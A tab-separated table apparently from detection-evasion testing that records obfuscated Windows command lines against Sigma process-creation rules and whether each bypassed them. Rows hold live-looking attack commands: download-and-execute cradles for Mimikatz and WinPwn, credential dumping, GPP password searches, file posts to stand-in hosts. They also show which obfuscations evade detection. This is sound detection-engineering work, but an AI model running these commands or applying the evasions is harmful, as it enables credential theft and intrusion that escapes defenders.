Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1552.006	proc_creation_win_findstr_gpp_passwords	Findstr GPP Passwords	91a2c315-9ee6-4052-a853-6f6a8238f90d		"findstr /S ""cpass""""word"" \THAIMX\sysvol\*.xml"	TRUE	TRUE	TRUE	
t1552.006	proc_creation_win_findstr_gpp_passwords	Findstr GPP Passwords	91a2c315-9ee6-4052-a853-6f6a8238f90d	findstr  /S cpassword \THAIMX\sysvol\..\sysvol\*.xml	findstr /S cpassword \THAIMX\sysvol\..\sysvol\*.xml	TRUE	FALSE	FALSE	Findstr GPP Passwords (91a2c315-9ee6-4052-a853-6f6a8238f90d)
t1552.006	proc_creation_win_findstr_gpp_passwords	Findstr GPP Passwords	91a2c315-9ee6-4052-a853-6f6a8238f90d	findstr  /S cpassword \THAIMX\SYSVOL\*.xml	findstr /S cpassword \THAIMX\SYSVOL\*.xml	TRUE	FALSE	FALSE	Findstr GPP Passwords (91a2c315-9ee6-4052-a853-6f6a8238f90d)
t1552.006	proc_creation_win_findstr_lsass	LSASS Process Reconnaissance Via Findstr.EXE	fe63010f-8823-4864-a96b-a7b4a0f7b929		"findstr ""ls""""ass"""	TRUE	TRUE	TRUE	
t1552.006	proc_creation_win_findstr_lsass	LSASS Process Reconnaissance Via Findstr.EXE	fe63010f-8823-4864-a96b-a7b4a0f7b929		findstr lsa*	TRUE	TRUE	TRUE	
t1552.006	proc_creation_win_findstr_lsass	LSASS Process Reconnaissance Via Findstr.EXE	fe63010f-8823-4864-a96b-a7b4a0f7b929		"findstr /R ""lsa[s][s]"""	TRUE	TRUE	TRUE	
t1057	proc_creation_win_findstr_recon_pipe_output	Recon Command Output Piped To Findstr.EXE	ccb5742c-c248-4982-8c5c-5571b9275ad3		"cmd /c ""tasklist > %temp%	.txt && findstr powershell %temp%	.txt"""	FALSE	FALSE	FALSE	
t1057	proc_creation_win_findstr_recon_pipe_output	Recon Command Output Piped To Findstr.EXE	ccb5742c-c248-4982-8c5c-5571b9275ad3		"cmd /c ""tasklist |; findstr powershell"""	FALSE	FALSE	FALSE	
t1057	proc_creation_win_findstr_recon_pipe_output	Recon Command Output Piped To Findstr.EXE	ccb5742c-c248-4982-8c5c-5571b9275ad3		"cmd /c ""tasklist . | findstr powershell"""	FALSE	FALSE	FALSE	
t1120	proc_creation_win_fsutil_drive_enumeration	Fsutil Drive Enumeration	63de06b9-a385-40b5-8b32-73f2b9ef84b6		"fsutil fsinfo dri""""ves"	TRUE	TRUE	TRUE	
t1120	proc_creation_win_fsutil_drive_enumeration	Fsutil Drive Enumeration	63de06b9-a385-40b5-8b32-73f2b9ef84b6		"cmd.exe /c ""fsutil fsinfo dri^ves"""	FALSE	FALSE	FALSE	
t1120	proc_creation_win_fsutil_drive_enumeration	Fsutil Drive Enumeration	63de06b9-a385-40b5-8b32-73f2b9ef84b6	fsutil  fsinfo drives	fsutil fsinfo drives	TRUE	FALSE	FALSE	Fsutil Drive Enumeration (63de06b9-a385-40b5-8b32-73f2b9ef84b6)
t1059	proc_creation_win_fsutil_symlinkevaluation	Fsutil Behavior Set SymlinkEvaluation	c0b2768a-dd06-4671-8339-b16ca8d1f27f		"fsutil behavior set ""Symlink""""Evaluation"" R2L:1"	TRUE	TRUE	TRUE	
t1059	proc_creation_win_fsutil_symlinkevaluation	Fsutil Behavior Set SymlinkEvaluation	c0b2768a-dd06-4671-8339-b16ca8d1f27f	fsutil  behavior   set   SymlinkEvaluation R2L:1	fsutil behavior   set   SymlinkEvaluation R2L:1	TRUE	FALSE	FALSE	Fsutil Behavior Set SymlinkEvaluation (c0b2768a-dd06-4671-8339-b16ca8d1f27f)
t1059	proc_creation_win_fsutil_symlinkevaluation	Fsutil Behavior Set SymlinkEvaluation	c0b2768a-dd06-4671-8339-b16ca8d1f27f		"cmd.exe /c ""fsutil behavior set Symlink^Evaluation R2L:1"""	FALSE	FALSE	FALSE	
t1059	proc_creation_win_powershell_download_iex	PowerShell Download and Execution Cradles	85b0b087-eddf-4a2b-b033-d771fa2b9775		"powershell.exe -c ""irm test.domain/ffe | .((Get-Variable *md*).Value.Name[3,11,2]-join'')"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059	proc_creation_win_powershell_download_iex	PowerShell Download and Execution Cradles	85b0b087-eddf-4a2b-b033-d771fa2b9775		"powershell.exe -c ""$w = New-Object Net.WebClient; $w.GetType().GetMethod('DownloadString').Invoke($w, '[https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1](https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1)') | iex"""	TRUE	TRUE	FALSE	HackTool - WinPwn Execution (d557dc06-62e8-4468-a8e8-7984124908ce); HackTool - WinPwn Execution (d557dc06-62e8-4468-a8e8-7984124908ce); Suspicious PowerShell IEX Execution Patterns (09576804-7a05-458e-a817-eb718ca91f54); Suspicious PowerShell IEX Execution Patterns (09576804-7a05-458e-a817-eb718ca91f54); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059	proc_creation_win_powershell_download_iex	PowerShell Download and Execution Cradles	85b0b087-eddf-4a2b-b033-d771fa2b9775	"cmd.exe /c ""powershell.exe -c \""Invoke-WebRequest  '[https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1](https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1)' | iex\"""""	"powershell.exe -c ""Invoke-WebRequest  '[https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1](https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1)' | iex"""	TRUE	FALSE	FALSE	HackTool - WinPwn Execution (d557dc06-62e8-4468-a8e8-7984124908ce); HackTool - WinPwn Execution (d557dc06-62e8-4468-a8e8-7984124908ce); PowerShell Download and Execution Cradles (85b0b087-eddf-4a2b-b033-d771fa2b9775); PowerShell Download and Execution Cradles (85b0b087-eddf-4a2b-b033-d771fa2b9775); Suspicious PowerShell IEX Execution Patterns (09576804-7a05-458e-a817-eb718ca91f54); Suspicious PowerShell IEX Execution Patterns (09576804-7a05-458e-a817-eb718ca91f54); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1615	proc_creation_win_gpresult_execution	Gpresult Display Group Policy Information	e56d3073-83ff-4021-90fe-c658e0709e72		gpresult -z	TRUE	TRUE	TRUE	
t1615	proc_creation_win_gpresult_execution	Gpresult Display Group Policy Information	e56d3073-83ff-4021-90fe-c658e0709e72		gpresult /h report.html /f	TRUE	TRUE	TRUE	
t1615	proc_creation_win_gpresult_execution	Gpresult Display Group Policy Information	e56d3073-83ff-4021-90fe-c658e0709e72	"gpresult  \""/z\"""	"gpresult ""/z"""	TRUE	FALSE	FALSE	Gpresult Display Group Policy Information (e56d3073-83ff-4021-90fe-c658e0709e72)
t1105	proc_creation_win_gup_download	File Download Using Notepad++ GUP Utility	44143844-0631-49ab-97a0-96387d6b2d7c		"GUP.exe  -unzipTo  """" ""C:\Temp"" ""Sample [https://getsamplefiles.com/download/zip/sample-2.zip](https://getsamplefiles.com/download/zip/sample-2.zip) CAC4D26F32CA629DFB10FE614ED00EB1066A0C0011386290D3426C3DE2E53AC6"""	FALSE	FALSE	FALSE	
t1105	proc_creation_win_gup_download	File Download Using Notepad++ GUP Utility	44143844-0631-49ab-97a0-96387d6b2d7c		"GUP.exe -unzipTo """" ""C:\Temp"" ""Sample h""""ttp://[getsamplefiles.com/download/zip/sample-2.zip](https://getsamplefiles.com/download/zip/sample-2.zip) CAC4D26F32CA629DFB10FE614ED00EB1066A0C0011386290D3426C3DE2E53AC6"""	FALSE	FALSE	FALSE	
t1105	proc_creation_win_gup_download	File Download Using Notepad++ GUP Utility	44143844-0631-49ab-97a0-96387d6b2d7c		"GUP.exe ""-unzipTo"" """" ""C:\Temp"" ""Sample [https://getsamplefiles.com/download/zip/sample-2.zip](https://getsamplefiles.com/download/zip/sample-2.zip) CAC4D26F32CA629DFB10FE614ED00EB1066A0C0011386290D3426C3DE2E53AC6"""	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_replace	Replace.exe Usage	9292293b-8496-4715-9db6-37028dcda4b3		"C:\Windows\System32eplace.exe ""C:\AtomicRedTeam\atomics\T1105\srcedcanary.cab"" C:\Users	haim\AppData\Local\Temp ""/A"""	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_replace	Replace.exe Usage	9292293b-8496-4715-9db6-37028dcda4b3		"cmd.exe /c ""C:\Windows\System32eplace.exe ""C:\AtomicRedTeam\atomics\T1105\srcedcanary.cab"" C:\Users	haim\AppData\Local\Temp /^A"""	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_replace	Replace.exe Usage	9292293b-8496-4715-9db6-37028dcda4b3		"C:\Windows\System32eplace.exe ""C:\AtomicRedTeam\atomics\T1105\srcedcanary.cab"" C:\Users	haim\AppData\Local\Temp  /A"	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_susp_certreq_download	Suspicious Certreq Command to Download	4480827a-9799-4232-b2c4-ccc6c4e9e12b		"certreq.exe  -Post  -config  [https://example.com](https://example.com) c:\windows\win.ini C:\Users	haim\AppData\Local\Temp\Atomic-license.txt"	TRUE	TRUE	TRUE	
t1105	proc_creation_win_lolbin_susp_certreq_download	Suspicious Certreq Command to Download	4480827a-9799-4232-b2c4-ccc6c4e9e12b		"certreq.exe /Post /config [https://example.com](https://example.com) c:\windows\win.ini C:\Users	haim\AppData\Local\Temp\Atomic-license.txt"	TRUE	TRUE	TRUE	
t1105	proc_creation_win_lolbin_susp_certreq_download	Suspicious Certreq Command to Download	4480827a-9799-4232-b2c4-ccc6c4e9e12b		"certreq.exe ""-Post"" ""-config"" [https://example.com](https://example.com) ""C:\Windows\win.ini"" C:\Users	haim\AppData\Local\Temp\Atomic-license.txt"	TRUE	TRUE	TRUE	
t1105	proc_creation_win_powershell_invoke_webrequest_direct_ip	Suspicious Invoke-WebRequest Execution With DirectIP	1edff897-9146-48d2-9066-52e8d8f80a2f		"""powershell.exe"" & {$content = Get-Content C:\Windows\System32
otepad.exe
Invoke-WebRequest  -Uri [http://127.0.0.1](http://127.0.0.1) -Method POST -Body $content}"	FALSE	FALSE	FALSE	
t1105	proc_creation_win_powershell_invoke_webrequest_direct_ip	Suspicious Invoke-WebRequest Execution With DirectIP	1edff897-9146-48d2-9066-52e8d8f80a2f		"""powershell.exe"" & {$content = Get-Content C:\Windows\System32
otepad.exe
& 'Invoke-WebRequest' -Uri [http://127.0.0.1](http://127.0.0.1) -Method POST -Body $content}"	FALSE	FALSE	FALSE	
t1105	proc_creation_win_powershell_invoke_webrequest_direct_ip	Suspicious Invoke-WebRequest Execution With DirectIP	1edff897-9146-48d2-9066-52e8d8f80a2f		"""powershell.exe"" & {$content = Get-Content C:\Windows\System32
otepad.exe
Invoke-WebRequest -Uri [http://0x7f000001](https://www.google.com/search?q=http://0x7f000001) -Method POST -Body $content}"	FALSE	FALSE	FALSE	
t1105	proc_creation_win_powershell_invoke_webrequest_download	Suspicious Invoke-WebRequest Execution	5e3cc4d8-3e68-43db-8656-eaaeefdec9cc		"powershell.exe  iwr -URI [https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt) -Outfile C:\Users	haim\AppData\Local\Temp\Atomic-license.txt"	FALSE	FALSE	FALSE	
t1105	proc_creation_win_powershell_invoke_webrequest_download	Suspicious Invoke-WebRequest Execution	5e3cc4d8-3e68-43db-8656-eaaeefdec9cc		"powershell.exe & {& 'Invoke-WebRequest' -Uri [https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt) -Outfile C:\Users	haim\AppData\Local\Temp\Atomic-license.txt}"	TRUE	TRUE	FALSE	PowerShell Script Run in AppData (ac175779-025a-4f12-98b0-acdaeb77ea85); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1105	proc_creation_win_powershell_invoke_webrequest_download	Suspicious Invoke-WebRequest Execution	5e3cc4d8-3e68-43db-8656-eaaeefdec9cc		"powershell.exe iwr -Outfile C:\Users	haim\AppData\Local\Temp\Atomic-license.txt [https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt)"	FALSE	FALSE	FALSE	
t1218.001	proc_creation_win_hh_chm_execution	HH.EXE Execution	68c8acb4-1b60-4890-8e82-3ddf7a6dba84		"hh.exe -decompile C:\Users	haim\AppData\Local\Temp ""C:\AtomicRedTeam\atomics\T1218.001\src\T1218.001.ch""""m"""	TRUE	TRUE	TRUE	
t1218.001	proc_creation_win_hh_chm_execution	HH.EXE Execution	68c8acb4-1b60-4890-8e82-3ddf7a6dba84		"cmd.exe /c ""hh.exe -decompile C:\Users	haim\AppData\Local\Temp ""C:\AtomicRedTeam\atomics\T1218.001\src\T1218.001.ch^m"""""	FALSE	FALSE	FALSE	
t1218.001	proc_creation_win_hh_chm_execution	HH.EXE Execution	68c8acb4-1b60-4890-8e82-3ddf7a6dba84	"hh.exe  -decompile C:\Users	haim\AppData\Local\Temp \""\?\C:\AtomicRedTeam\atomics\T1218.001\src\T1218.001.chm.\"""	"hh.exe -decompile C:\Users	haim\AppData\Local\Temp ""\?\C:\AtomicRedTeam\atomics\T1218.001\src\T1218.001.chm."""	TRUE	FALSE	FALSE	HH.EXE Execution (68c8acb4-1b60-4890-8e82-3ddf7a6dba84)
t1218.001	proc_creation_win_hh_chm_remote_download_or_execution	Remote CHM File Download/Execution Via HH.EXE	f57c58b3-ee69-4ef5-9041-455bf39aaa89	"hh.exe  h\""\""ttps://[raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm)"	"hh.exe h""""ttps://[raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm)"	TRUE	FALSE	FALSE	Remote CHM File Download/Execution Via HH.EXE (f57c58b3-ee69-4ef5-9041-455bf39aaa89); HH.EXE Execution (68c8acb4-1b60-4890-8e82-3ddf7a6dba84)
t1218.001	proc_creation_win_hh_chm_remote_download_or_execution	Remote CHM File Download/Execution Via HH.EXE	f57c58b3-ee69-4ef5-9041-455bf39aaa89		"cmd.exe /c ""hh.exe htt^ps://[raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm)"""	FALSE	FALSE	FALSE	
t1218.001	proc_creation_win_hh_chm_remote_download_or_execution	Remote CHM File Download/Execution Via HH.EXE	f57c58b3-ee69-4ef5-9041-455bf39aaa89	hh.exe  //[raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm)	hh.exe //[raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm)	TRUE	FALSE	FALSE	Remote CHM File Download/Execution Via HH.EXE (f57c58b3-ee69-4ef5-9041-455bf39aaa89); HH.EXE Execution (68c8acb4-1b60-4890-8e82-3ddf7a6dba84)
t1218.011	proc_creation_win_hktl_cobaltstrike_load_by_rundll32	CobaltStrike Load by Rundll32	ae9c6a7c-9521-42a6-915e-5aaa8689d529	rundll32  2.dll, StartW	rundll32 2.dll, StartW	TRUE	FALSE	FALSE	CobaltStrike Load by Rundll32 (ae9c6a7c-9521-42a6-915e-5aaa8689d529)
t1218.011	proc_creation_win_hktl_cobaltstrike_load_by_rundll32	CobaltStrike Load by Rundll32	ae9c6a7c-9521-42a6-915e-5aaa8689d529		"rundll32 2.dll, ""StartW"""	TRUE	TRUE	TRUE	
t1218.011	proc_creation_win_hktl_cobaltstrike_load_by_rundll32	CobaltStrike Load by Rundll32	ae9c6a7c-9521-42a6-915e-5aaa8689d529	rundll32  2.dll,StartW	rundll32 2.dll,StartW	TRUE	FALSE	FALSE	CobaltStrike Load by Rundll32 (ae9c6a7c-9521-42a6-915e-5aaa8689d529)
t1218.011	proc_creation_win_lolbin_pcwutl	Code Execution via Pcwutl.dll	9386d78a-7207-4048-9c9f-a93a7c2d1c05		"rundll32.exe pcwutl.dll,""Launch""""Application"" C:\WINDOWS\System32
otepad.exe"	TRUE	TRUE	TRUE	
t1218.011	proc_creation_win_lolbin_pcwutl	Code Execution via Pcwutl.dll	9386d78a-7207-4048-9c9f-a93a7c2d1c05	"rundll32.exe  pcwutl.d\""\""ll,LaunchApplication C:\WINDOWS\System32"	"rundll32.exe pcwutl.d""""ll,LaunchApplication C:\WINDOWS\System32
otepad.exe"	TRUE	FALSE	FALSE	Code Execution via Pcwutl.dll (9386d78a-7207-4048-9c9f-a93a7c2d1c05); Rundll32 Execution With Uncommon DLL Extension (c3a99af4-35a9-4668-879e-c09aeb4f2bdf)
t1218.011	proc_creation_win_lolbin_pcwutl	Code Execution via Pcwutl.dll	9386d78a-7207-4048-9c9f-a93a7c2d1c05		"cmd.exe /c ""rundll32.exe pcwutl.dll,Launch^Application C:\WINDOWS\System32
otepad.exe"""	TRUE	TRUE	TRUE	
t1218.011	proc_creation_win_rundll32_installscreensaver	Rundll32 InstallScreenSaver Execution	15bd98ea-55f4-4d37-b09a-e7caa0fa2221		"rundll32.exe desk.cpl,InstallScreen""""Saver not_an_scr.scr"	TRUE	TRUE	TRUE	
t1218.011	proc_creation_win_rundll32_installscreensaver	Rundll32 InstallScreenSaver Execution	15bd98ea-55f4-4d37-b09a-e7caa0fa2221		"cmd.exe /c ""rundll32.exe desk.cpl,InstallScreen^Saver not_an_scr.scr"""	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_installscreensaver	Rundll32 InstallScreenSaver Execution	15bd98ea-55f4-4d37-b09a-e7caa0fa2221		rundll32.exe desk.cpl, #1	TRUE	TRUE	TRUE	
t1110.002	proc_creation_win_hktl_hashcat	HackTool - Hashcat Password Cracker Execution	39b31e81-5f5f-4898-9c0e-2160cfc0f9bf		"C:\AtomicRedTeam\atomics\..\ExternalPayloads\hashcat6\hashcat-6.1.1\hashcat.exe --attack-mode 0 -m 1000 -r .ules\Incisive-leetspeak.rule C:\AtomicRedTeam\atomics\T1110.002\src\sam.txt C:\AtomicRedTeam\atomics\T1110.002\src\password.lst"	TRUE	TRUE	TRUE	
t1110.002	proc_creation_win_hktl_hashcat	HackTool - Hashcat Password Cracker Execution	39b31e81-5f5f-4898-9c0e-2160cfc0f9bf		"C:\AtomicRedTeam\atomics\..\ExternalPayloads\hashcat6\hashcat-6.1.1\hashcat.exe -a 0 --hash-type 1000 -r .ules\Incisive-leetspeak.rule C:\AtomicRedTeam\atomics\T1110.002\src\sam.txt C:\AtomicRedTeam\atomics\T1110.002\src\password.lst"	TRUE	TRUE	TRUE	
t1110.002	proc_creation_win_hktl_hashcat	HackTool - Hashcat Password Cracker Execution	39b31e81-5f5f-4898-9c0e-2160cfc0f9bf		"C:\AtomicRedTeam\atomics\..\ExternalPayloads\hashcat6\hashcat-6.1.1\hashcat.exe -a  0 -m 1000  -r  .ules\Incisive-leetspeak.rule C:\AtomicRedTeam\atomics\T1110.002\src\sam.txt C:\AtomicRedTeam\atomics\T1110.002\src\password.lst"	TRUE	TRUE	TRUE	
t1003.001	proc_creation_win_hktl_mimikatz_command_line	HackTool - Mimikatz Execution	a642964e-bead-4bed-8910-1bb4d63e3b4d		"mimikatz.exe ""lsadump""""::dcsync /domain:%userdnsdomain% /user:krbtgt@%userdnsdomain%"" ""exit"""	FALSE	FALSE	FALSE	
t1003.001	proc_creation_win_hktl_mimikatz_command_line	HackTool - Mimikatz Execution	a642964e-bead-4bed-8910-1bb4d63e3b4d		"mimikatz.exe ""privilege""""::debug"" ""sekurlsa""""::logonpasswords"" ""exit"""	FALSE	FALSE	FALSE	
t1003.001	proc_creation_win_hktl_mimikatz_command_line	HackTool - Mimikatz Execution	a642964e-bead-4bed-8910-1bb4d63e3b4d	"cmd.exe /c ""powershell.exe \""IEX (New-Object Net.WebClient).DownloadString('[https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1)'); Invoke-Mimikatz -Dump\""\""Creds\"""""	"powershell.exe ""IEX (New-Object Net.WebClient).DownloadString('[https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1)'); Invoke-Mimikatz -Dump""""Creds"""	TRUE	FALSE	FALSE	HackTool - Mimikatz Execution (a642964e-bead-4bed-8910-1bb4d63e3b4d); HackTool - Mimikatz Execution (a642964e-bead-4bed-8910-1bb4d63e3b4d); PowerShell Download and Execution Cradles (85b0b087-eddf-4a2b-b033-d771fa2b9775); PowerShell Download and Execution Cradles (85b0b087-eddf-4a2b-b033-d771fa2b9775); Malicious PowerShell Commandlets - ProcessCreation (02030f2f-6199-49ec-b258-ea71b07e03dc); Malicious PowerShell Commandlets - ProcessCreation (02030f2f-6199-49ec-b258-ea71b07e03dc); Suspicious PowerShell Download and Execute Pattern (e6c54d94-498c-4562-a37c-b469d8e9a275); Suspicious PowerShell Download and Execute Pattern (e6c54d94-498c-4562-a37c-b469d8e9a275); Suspicious Program Names (efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6); Suspicious Program Names (efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6); PowerShell Download Pattern (3b6ab547-8ec2-4991-b9d2-2b06702a48d7); Suspicious PowerShell Invocations - Specific - ProcessCreation (536e2947-3729-478c-9903-745aaffe60d2); Suspicious PowerShell Invocations - Specific - ProcessCreation (536e2947-3729-478c-9903-745aaffe60d2); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1134.004	proc_creation_win_hktl_selectmyparent	HackTool - PPID Spoofing SelectMyParent Tool Execution	52ff7941-8211-46f9-84f8-9903efb7077d		"""powershell.exe"" & {. """"C:\AtomicRedTeam\atomics\T1134.004\src\PPID-Spoof.ps1""""
$ppid=Get-Process explorer | select -expand id
PPID-Spoof -ppid $ppid  -spawnto  """"C:\Program Files\Internet Explorer\iexplore.exe"""" -dllpath """"C:\AtomicRedTeam\atomics\T1134.004\bin\calc.dll""""}"	FALSE	FALSE	FALSE	
t1134.004	proc_creation_win_hktl_selectmyparent	HackTool - PPID Spoofing SelectMyParent Tool Execution	52ff7941-8211-46f9-84f8-9903efb7077d		"""powershell.exe"" & {. """"C:\AtomicRedTeam\atomics\T1134.004\src\PPID-Spoof.ps1""""
$ppid=Get-Process explorer | select -expand id
PPID-Spoof -ppid $ppid ""-spawnto"" """"C:\Program Files\Internet Explorer\iexplore.exe"""" -dllpath """"C:\AtomicRedTeam\atomics\T1134.004\bin\calc.dll""""}"	FALSE	FALSE	FALSE	
t1134.004	proc_creation_win_hktl_selectmyparent	HackTool - PPID Spoofing SelectMyParent Tool Execution	52ff7941-8211-46f9-84f8-9903efb7077d		"""powershell.exe"" & {. """"C:\AtomicRedTeam\atomics\T1134.004\src\PPID-Spoof.ps1""""
$ppid=Get-Process explorer | select -expand id
PPID-Spoof -dllpath """"C:\AtomicRedTeam\atomics\T1134.004in\calc.dll"""" -ppid $ppid -spawnto """"C:\Program Files\Internet Explorer\iexplore.exe""""}"	FALSE	FALSE	FALSE	
t1087	proc_creation_win_hktl_soaphound_execution	HackTool - SOAPHound Execution	e92a4287-e072-4a40-9739-370c106bb750		"""C:\AtomicRedTeam\atomics\T1059.001in\SOAPHound.exe"" --user thaim THAIMX --password P@ssword1 --dc 10.0.1.14 --buildcache  -c c:	emp\cache.txt"	FALSE	FALSE	FALSE	
t1087	proc_creation_win_hktl_soaphound_execution	HackTool - SOAPHound Execution	e92a4287-e072-4a40-9739-370c106bb750		"""C:\AtomicRedTeam\atomics\T1059.001in\SOAPHound.exe"" --user thaim THAIMX --password P@ssword1 --dc 10.0.1.14 ""--buildcache"" ""-c"" c:	emp\cache.txt"	FALSE	FALSE	FALSE	
t1087	proc_creation_win_hktl_soaphound_execution	HackTool - SOAPHound Execution	e92a4287-e072-4a40-9739-370c106bb750		"""C:\AtomicRedTeam\atomics\T1059.001in\SOAPHound.exe"" --user thaim --password P@ssword1 --domain THAIMX --dc 10.0.1.14 --bhdump --cachefilename=c:	emp\cache.txt --outputdirectory=c:	emp	est2"	FALSE	FALSE	FALSE	
t1216.001	proc_creation_win_lolbin_pubprn	Pubprn.vbs Proxy Execution	1fb76ab8-fa60-4b01-bddd-71e89bf555da		"cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost ""sc""""ript:[https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct)"""	TRUE	TRUE	TRUE	
t1216.001	proc_creation_win_lolbin_pubprn	Pubprn.vbs Proxy Execution	1fb76ab8-fa60-4b01-bddd-71e89bf555da	"cmd.exe  /c \""cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost \""script:[https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct)\""\"""	"cmd.exe /c ""cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost ""sc^ript:[https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct)"""""	TRUE	FALSE	FALSE	Pubprn.vbs Proxy Execution (1fb76ab8-fa60-4b01-bddd-71e89bf555da)
